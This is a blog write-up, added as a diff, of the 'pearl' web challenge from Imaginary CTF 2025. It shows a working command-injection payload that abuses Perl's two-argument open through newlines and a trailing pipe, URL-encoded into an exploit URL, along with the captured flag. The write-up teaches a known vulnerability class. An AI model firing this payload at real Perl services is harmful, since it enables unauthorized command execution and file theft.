@@ -1,0 +1,111 @@
+---
+title: "Web / Pearl - Imaginary CTF 2025"
+excerpt: "A writeup on the Web / Pearl challenge from Imaginary CTF 2025"
+category:
+  - "CTF"
+  - "Writeups"
+tags:
+  - "CTF"
+  - "Web"
+  - "Perl"
+  - "Command Injection"
+  - "2025"
+authors:
+    - "harshfeudal"
+---
+
+## The Challenge
+
+*pearl (100pts)*
+
+*Description*
+
+*I used perl to make my pearl shop. Soon, we will expand to selling Perler bead renditions of Perlin noise.*
+
+*http://pearl.chal.imaginaryctf.org (link might be expired)*
+
+## The Walkthrough
+
+This was an easy challenge, but I'm writing it up for the blog. :D
+
+The challenge provided the source code, which made it quite straightforward. You can take a quick look at the provided file structure for a hint on finding the flag on the server:
+
+![image.png](image.png)
+
+As you can see, the `flag.txt` file is located right next to the Perl file (which has a `.pl` extension). Perl is a web programming language that was quite popular in the past; some sites still use it, so it's not completely dead, but it is quite rare.
+
+For this challenge, besides looking at the source code, you also need to examine the `Dockerfile`. This file acts like a vessel to "ship" your project onto the host server conveniently. I'll dive into the `Dockerfile` before reading the source code to understand how the server is set up:
+
+```docker
+WORKDIR /app
+COPY server.pl /app/server.pl
+COPY files/ /app/files/
+COPY flag.txt /
+RUN mv /flag.txt /flag-$(md5sum /flag.txt | awk '{print $1}').txt
+```
+
+Pay attention to the last line of the code above. The command `mv /flag.txt /flag-$(md5sum /flag.txt | awk '{print $1}').txt` means it **renames the file**. Therefore, even if you find a vulnerability, searching for the exact name `flag.txt` will never work. The file's name is changed to `flag-{...}`, where the part in the brackets is related to its MD5 hash.
+
+Looking at the `server.pl` file, you'll notice the following:
+
+* The challenge uses Perl's two-argument `open` function to read files (`open(my $fh, $fullpath)`). This is a **dangerous function** because it can interpret special characters in the file path to execute system commands.
+* The challenge also has a filter using a regular expression (regex) to block malicious characters, but it **doesn't block the newline character** (hehehe). In case you don't know, here it is:
+
+```perl
+if ($fullpath =~ /\.\.|[,\`\)\(;&]|\|.*\|/) {
+    $c->send_error(RC_BAD_REQUEST, "Invalid path");
+    next;
+}
+```
+
+This is enough information to create an exploit.
+
+---
+
+Actually, the server always prepends the `./files/` prefix to the path. If we just send a payload like `cat /flag-*.txt|`, the server will turn it into `./files/cat /flag-*.txt`, and this command will fail because `./files/cat` doesn't exist.
+
+Therefore, our approach for the payload should be as follows:
+
+```
+
+sh -c "cat /flag-*.txt"
+|
+```
+
+I didn't add that spacing on purpose; you really have to use newlines like that. 🥲
+
+And notice that you need the `|` **pipe character** to activate the command. Without it, you'll get an error. This is because it's a command injection in Perl; you can learn more about it [here](https://github.com/payloadbox/command-injection-payload-list).
+
+As I mentioned earlier, some characters have been blacklisted, so you need to use **URL encoding**.
+
+Link: [https://www.urlencoder.org/](https://www.urlencoder.org/)
+
+Now you just need to paste the payload in there:
+
+![image.png](image%201.png)
+
+Then, press encode, and you'll get the following string:
+
+```
+%0Ash%20-c%20%22cat%20%2Fflag-%2A.txt%22%0A%7C
+```
+
+At this point, you paste it directly into the URL like so:
+
+```
+http://pearl.chal.imaginaryctf.org/%0Ash%20-c%20%22cat%20%2Fflag-%2A.txt%22%0A%7C
+```
+
+And a page containing the flag will appear! :D
+
+```
+ictf{uggh_why_do_people_use_perl_1f023b129a22}
+```
+
+## Final Words
+
+This is a classic example of a command injection challenge that you should try if you're not familiar with the concept. However, modern websites are no longer vulnerable in this way (or if they are, it's extremely rare). :D
+
+easy/10
+
+<img src="image%202.png" alt="image.png" style="width: 30%; height: auto;" />
